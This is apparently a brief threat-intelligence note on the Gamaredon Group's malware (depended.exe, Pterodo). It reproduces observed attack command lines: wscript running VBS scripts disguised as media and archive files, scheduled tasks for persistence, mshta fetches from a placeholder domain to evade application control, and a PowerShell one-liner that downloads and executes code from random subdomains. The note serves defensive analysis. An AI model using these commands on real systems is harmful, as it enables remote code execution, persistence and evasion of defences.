# Gamaredon Group

## Features

1. The depended.exe payload will execute two VBS scripts:

> "CSIDL_SYSTEM\wscript.exe" CSIDL_PROFILE\appdata\roaming\reflect.rar //e:VBScript //b

>	"CSIDL_SYSTEM\wscript.exe" CSIDL_PROFILE\appdata\local\temp\deep-thoughted. //e:VBScript //b

Then a scheduled task will be created to ensure the durability:SCHTASKS /CREATE /sc minute /mo 10 /tn "deep-thoughted" /tr "wscript.exe " CSIDL_COMMON_PICTURES\deep-thoughted.ppt //e:VBScript //b" /F，the scheduled task runs every 10 minutes.
Of course, the organization will also use MSHTA to bypass application control policies:"CSIDL_SYSTEM\cmd.exe" /c CSIDL_SYSTEM\mshta.exe http://domain/FILM.html /f id=[REDACTED].

2. When the delivered Pterodo malware is active, it will download scripts and tools through other command controllers, and then create scheduled tasks.

```bash
"CSIDL_SYSTEM\wscript.exe" CSIDL_PROFILE\appdata\local\temp\12382. //e:VBScript //b
"CSIDL_SYSTEM\cmd.exe" /c CSIDL_SYSTEM\mshta.exe http://domain/7-ZIP.html /f id=<?,?>
CSIDL_SYSTEM\mshta.exe http://domain/7-ZIP.html /f id=<?,?>
//MSHTA bypass execution
"CSIDL_SYSTEM\schtasks.exe" /CREATE /sc minute /mo 12 /tn "MediaConverter" /tr "wscript.exe " CSIDL_COMMON_MUSIC\mediatv.mov //e:VBScript //b " /F"
"CSIDL_SYSTEM\schtasks.exe" /CREATE /sc minute /mo 12 /tn "VideoHostName" /tr "wscript.exe " CSIDL_COMMON_VIDEO\videotv.m3u //e:VBScript //b " /F"
//Every 12 minutes
```

3. Malicious software often uses random subdomains as command controllers.

```powershell
"powershell.exe" $tmp = $ (New-object net.webclient) .DownloadString('http://'+[System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.[domain]')+'/get.php');Invoke-Expression $tmp
```
